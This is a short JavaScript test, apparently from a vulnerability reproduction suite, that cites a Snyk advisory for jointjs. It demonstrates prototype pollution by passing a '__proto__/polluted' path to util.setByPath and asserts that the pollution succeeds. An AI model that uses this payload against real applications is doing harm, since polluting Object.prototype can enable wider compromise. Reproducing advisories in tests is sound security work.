//https://snyk.io/vuln/SNYK-JS-JOINTJS-1024444
test("prototype pollution in jointjs", () => {
  expect({}.polluted).toBe(undefined);

  const jointjs = require("jointjs");
  jointjs.util.setByPath({}, "__proto__/polluted", "yes", "/");

  expect({}.polluted).toBe("yes");
});
